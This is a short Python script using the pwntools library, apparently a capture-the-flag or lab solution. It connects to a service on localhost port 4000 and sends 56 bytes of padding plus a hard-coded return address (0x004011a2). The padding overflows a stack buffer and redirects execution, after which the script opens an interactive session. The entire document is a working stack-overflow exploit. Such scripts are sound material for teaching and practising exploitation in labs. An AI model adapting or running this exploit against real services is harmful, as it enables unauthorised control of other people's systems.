from pwn import *
from time import sleep

EXPLOIT = b'0'*56 + p64(0x004011a2) + b'\n'

conn = remote('localhost',4000)
#print(conn.recvuntil(b' = '))
print(conn.recv())

conn.send(EXPLOIT)
sleep(1)
conn.interactive()